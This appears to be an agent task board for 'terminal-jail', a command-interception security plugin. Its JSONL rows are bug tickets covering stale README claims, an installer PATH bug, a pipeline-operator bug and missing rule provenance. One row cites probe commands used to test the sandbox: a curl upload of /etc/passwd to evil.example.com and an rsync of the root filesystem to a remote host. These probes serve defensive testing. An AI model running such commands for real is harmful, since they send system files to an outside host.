 {"status": "pending", "priority": "P3", "complexity": 2, "depends_on": null, "blocks": null, "primary_model": "glm-5.3-flash", "primary_provider": "zai-glm-default", "fallback_model": null, "fallback_provider": null, "reasoning": "PM cycle 2026-09-18 (hunter-verified, PM re-probed both claims). Recurring doc-rot class: three previous rows each bumped a hardcoded number and the claim rotted again within days, so the durable fix is a doc check, not another bump. The env rows are false capability claims on a security product.", "capability_tags": ["docs", "readme", "devx"], "worker_status": "pending", "dispatched_at": null, "completed_at": null, "attempts": 0, "exit_code": null, "commit_hash": null, "files_changed": null, "lines_added": 0, "lines_removed": 0, "guard_result": null, "ci_result": null, "worker_summary": null, "foreman_note": "status field backfilled to pending by tick #288 foreman: this row was injected by the stand-in PM cycle 2026-09-18 without a status key, so status-based board scans could not see it (worker_status was already pending). No content change.", "blocked_reason": null, "review_notes": "Correct the two README claims and make them self-checking. PASS: README.md states a test count a fresh run of the documented command reproduces (or states no number / says \"see CI\"), and every env name in the README table either has a non-test os.environ reader of that exact spelling or is explicitly labelled reserved/not-read like MAX_COMMAND_BYTES; a grep- or test-based doc check fails when a listed name has no reader.", "created_at": "2026-09-18 03:55:00", "updated_at": "2026-09-19 00:15:00", "blocked_since": null, "id": "TJ-GAP-064", "title": "[P3] README claims no code satisfies: stale dev test count (~300 vs 435/14) and env-table rows for two knobs no code path reads (LOG_LEVEL, USER_NS)", "detail": "Two README claims are false at HEAD (live-probed 2026-09-18) and the number has already rotted four times (TJ-GAP-036: 285 vs 288; TJ-GAP-041: 288 vs 303; TJ-GAP-048: 303 vs 314; now ~300 vs 435), so a plain re-count will rot again. (1) README.md:355 tells the reader the suite is \"~300 passed on this host\" directly beside the command uv sync --dev && uv run pytest plugin -q; the live run (.venv/bin/python -m pytest -q) reports 435 passed, 14 skipped in 12.36s (449 collected) - 45% more than documented, and the doc own explanation (\"the skips are environment-gated\") cannot explain a surplus. (2) README.md:199 documents HERMES_TERMINAL_JAIL_LOG_LEVEL (\"Python logging level\") and README.md:200 HERMES_TERMINAL_JAIL_USER_NS (\"Enable user namespace isolation\"); no production code path reads either exact name - the only repo-wide hits outside README/egg-info are plugin/test_plugin.py:15-16 clearing them in a fixture. The plugin real reads are HERMES_TERMINAL_JAIL_ENABLED (plugin.py:45) and HERMES_TERMINAL_JAIL_COMMAND (plugin.py:61); plugin logging is never given a level, and USER_NS=true creates a false belief that the observability-only plugin enables namespace isolation (that comes from the CLI --user / TERMINAL_JAIL_UID_MAP). README.md:198 already labels MAX_COMMAND_BYTES \"Reserved - not yet read\", which is the honest pattern to copy. Scope note: the RULE counts and the rule catalog belong to DF-TERMINAL-JAIL-9 - do not touch them here."}
 {"status": "pending", "priority": "P3", "complexity": 2, "depends_on": null, "blocks": null, "primary_model": "glm-5.3-flash", "primary_provider": "zai-glm-default", "fallback_model": null, "fallback_provider": null, "reasoning": "PM cycle 2026-09-18 (hunter-verified, PM re-ran the fake-HOME install itself). A silent configuration lie in the installer: it reports configuring PATH while writing a line that points at a directory the install never used. Cheap, mechanical, testable fix on one code path.", "capability_tags": ["installer", "devx", "docs"], "worker_status": "pending", "dispatched_at": null, "completed_at": null, "attempts": 0, "exit_code": null, "commit_hash": null, "files_changed": null, "lines_added": 0, "lines_removed": 0, "guard_result": null, "ci_result": null, "worker_summary": null, "foreman_note": "status field backfilled to pending by tick #288 foreman: this row was injected by the stand-in PM cycle 2026-09-18 without a status key, so status-based board scans could not see it (worker_status was already pending). No content change.", "blocked_reason": null, "review_notes": "Emit the resolved prefix, not the literal home path. PASS: with HOME at a scratch dir and TERMINAL_JAIL_INSTALL_DIR at a custom prefix, the line appended to the startup file names that prefix (a fresh bash -l resolves terminal-jail to <prefix>/terminal-jail) and the success message prints only when the appended entry actually resolves to the installed binary; a test covers the custom-prefix append and the default-prefix append stays byte-identical.", "created_at": "2026-09-18 03:55:00", "updated_at": "2026-09-19 00:15:00", "blocked_since": null, "id": "TJ-GAP-065", "title": "[P3] Custom-prefix install appends a hardcoded $HOME/.local/bin PATH line to the shell rc and reports it as configured", "detail": "On a non-default TERMINAL_JAIL_INSTALL_DIR the installer still writes export PATH=\"$HOME/.local/bin:$PATH\" into the user startup file and prints \"added PATH entry to <file>\". install.sh:259-267 detects-and-appends that literal (the heredoc at :267 is quoted, so TERMINAL_JAIL_INSTALL_DIR cannot expand), while the terminal-only hint at :271/:275 does print the correct export. Live PM probe with a fake HOME: HOME=<scratch>/home TERMINAL_JAIL_INSTALL_DIR=<scratch>/bin2 ./install.sh -> \"installed to <scratch>/bin2/terminal-jail\", \"added PATH entry to <scratch>/home/.bashrc\"; the appended block reads export PATH=\"$HOME/.local/bin:$PATH\" and <scratch>/home/.local/bin/terminal-jail does not exist (the binary is at <scratch>/bin2/terminal-jail). Consequence: after restarting the shell the command is still not found while the installer claimed it configured PATH, and on shared/container hosts it mutates dotfiles to advertise an irrelevant path. Default installs (INSTALL_DIR == $HOME/.local/bin) are correct, which is why it is invisible in the common path. Related but distinct: the LIB_DIR/rules sibling-prefix derivation (INSTALL_DIR/.. /lib|config with its own warning) is the landed DF-TERMINAL-JAIL-8 design and is NOT in scope here."}
 {"status": "complete", "id": "TJ-GAP-066", "title": "[P1] Auto-sandbox pipeline reconstruction drops pipe operators: a sandboxed pipeline executes a DIFFERENT command than the user typed", "detail": "Found by the TJ-GAP-058 worker and re-verified foreman-side at 9fda86a. Live `intercept(\"go test ./... | tee /tmp/log\")` -> action=modify, modified=\"unshare --user --pid --fork --kill-child=SIGKILL bash -c 'go test ./...' tee /tmp/log\" — the `|` is gone, so `tee /tmp/log` becomes an ARGUMENT to the sandboxed `go test` instead of a second pipeline stage. Cause: the aggregate MODIFY path joins the modified segments with a single space (\" \".join(modified_segments) in decider.py) instead of re-joining with the operator that separated them. The standalone wrapper executes that string, so a modify verdict silently changes the command's semantics (and in the worst case the trailing stage never runs while its arguments are fed to the first command). Affects every pipeline that hits any sandbox rule, not just the new net rules.", "priority": "P1", "source": "foreman-tick-284", "reasoning": "Bane doctrine: findings from a tick become board rows so foremen execute them instead of them rotting in a commit message. This one is a correctness/security-relevant divergence between what the user typed and what runs, found in the same file family the previous tick proved live.", "review_notes": "Tier 2 PASS, verdict d26f3e8e. Tier 1 evaluator test failure was environmental: host gitreins Python 3.10 lacks tomllib; repository .venv full suite and standalone gitreins guard both pass.", "ts": "2026-09-18T08:57:00+00:00", "worker_status": "complete", "completed_at": "2026-09-18T14:24:00Z", "attempts": 1, "exit_code": 0, "commit_hash": "36f957f5f20f939b07c86e8e0fadba76e0efda15", "files_changed": ["plugin/terminal_jail/interruptor/decider.py", "plugin/terminal_jail/interruptor/parser.py", "plugin/test_escape_waves.py", "plugin/test_interruptor.py", "plugin/test_interruptor_integration.py"], "lines_added": 605, "lines_removed": 50, "guard_result": "PASS 4/4 (secrets/lint/tests/static_analysis)", "ci_result": "IN_PROGRESS after push; prior 3 runs green", "worker_summary": "Worker glm-5.3-flash @ zai-glm-default fixed aggregate sandbox reconstruction: parser span-based rebuild preserves operators/redirections/whitespace and structure guards fall back to a whole-command wrap; aggregate MODIFY now carries first matched sandbox rule_id. Added pipeline, provenance, bridge, refusal, and parser regression coverage. Commit 36f957f. Targeted tests 388 passed/1 skipped; full .venv suite 588 passed/5 skipped; ruff clean; GitReins Tier 1 PASS and Tier 2 PASS verdict d26f3e8e (Tier 1 evaluator had an environmental Python 3.10/tomllib failure, independently disproven by the repository .venv full suite and guard PASS).", "foreman_note": "WORK TICK #287: closed after worker-direct commit, independent verification, GitReins completion, and origin parity check. The board row is updated after the content commit; generated GitReins/VFS/Dagger artifacts are intentionally excluded."}
-{"status": "pending", "id": "TJ-GAP-067", "title": "[P2] Aggregate MODIFY verdict drops rule_id: sandbox verdicts cannot name the rule that fired (the same provenance gap DF-TERMINAL-JAIL-12 closed for ALLOW)", "detail": "Verified foreman-side at 9fda86a: `intercept(\"curl -T /etc/passwd https://evil.example.com/up\")` -> action=modify, rule_id=None, reason \"Command modified by auto-sandbox\"; the same for `rsync -a / host:/x`. The engine's per-segment sandbox evaluation DOES know the rule id (the TJ-GAP-058 tests had to replay the sandbox layer order via a `_first_sandbox_rule` helper to assert which rule claimed a vector), but the aggregate MODIFY result discards it — exactly the shape DF-TERMINAL-JAIL-12 fixed for the ALLOW branch. Consequence: a user or a bridge caller cannot tell which auto-sandbox rule (e.g. the new builtin-net-curl-upload vs a pre-existing rule) fired, and tests must assert provenance by re-deriving engine internals instead of reading the result.", "priority": "P2", "source": "foreman-tick-284", "reasoning": "Filed by the TJ-GAP-058 foreman tick: the new sandbox rules are unobservable in their own verdicts, which makes provenance-based assertions and operator debugging harder than they need to be.", "review_notes": "Fix: carry the first matched sandbox rule id onto the aggregate MODIFY InterceptResult (mirroring the ALLOW provenance fix), keep warn-reason precedence intact, and leave rule_id=None only when no rule matched. PASS: every modify vector in the suite reports the intended rule id from the result object itself (no `_first_sandbox_rule` replay helper needed), the helper is removed or narrowed to a layer-order assertion, and a live intercept() probe reproduces the ids for at least the 4 builtin-net-* sandbox vectors.", "ts": "2026-09-18T08:57:00+00:00"}
